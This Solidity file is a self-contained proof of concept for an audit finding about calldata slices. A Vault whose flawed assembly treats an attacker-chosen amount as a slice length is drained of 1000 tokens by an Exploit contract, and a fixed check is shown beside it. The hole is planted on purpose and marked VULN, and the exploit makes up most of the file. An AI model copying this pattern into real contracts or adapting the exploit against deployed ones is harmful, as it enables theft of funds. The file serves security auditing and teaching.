// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Solady — calldata slice is not laid out like an ABI bytes array
    (Spearbit, December 2024, finding 45409).

    Lifebuoy copied `data.length` from the word before `data.offset`.
    That word is the length only for a real external `bytes` argument.
    claim() builds a pointer at the address argument. The word before it
    is the attacker-chosen amount. The copy treats that word as the amount
    and the slice as the recipient, and 1000 moves.

    The control rejects the pointer because the preceding word is not
    data.length. run() does not warp. */

contract PayToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Vault {
    PayToken public token;

    constructor(PayToken token_) {
        token = token_;
    }

    function claim(uint256 amount, address to) external returns (uint256 paid) {
        amount;
        to;
        bytes calldata crafted;
        uint256 sliceAt = 36;
        assembly {
            crafted.offset := sliceAt
            crafted.length := 32
        }
        paid = _release(crafted);
    }

    function _release(bytes calldata data) internal returns (uint256 paid) {
        address dest;
        uint256 word;
        // @> VULN: calldatacopy reads the word before the slice and that word is later spent
        assembly {
            let m := mload(0x40)
            calldatacopy(m, sub(data.offset, 0x20), add(0x20, data.length))
            word := mload(m)
            dest := mload(add(m, 0x20))
        }
        paid = word;
        token.transfer(dest, paid);
    }

    function claimFixed(uint256 amount, address to) external pure returns (uint256) {
        amount;
        to;
        bytes calldata crafted;
        assembly {
            crafted.offset := 36
            crafted.length := 32
        }
        uint256 word;
        assembly {
            word := calldataload(sub(crafted.offset, 0x20))
        }
        require(word == crafted.length, "crafted");
        return 0;
    }
}

contract Exploit {
    uint256 public constant AMOUNT = 1000 ether;

    PayToken public token;
    Vault public vault;
    uint256 public taken;

    constructor() {
        token = new PayToken();
        vault = new Vault(token);
        token.mint(address(vault), AMOUNT);
    }

    function run() external {
        taken = vault.claim(AMOUNT, address(this));
        require(taken == AMOUNT, "taken");
        require(token.balanceOf(address(this)) == AMOUNT, "moved");
        require(token.balanceOf(address(vault)) == 0, "vault");
    }
}
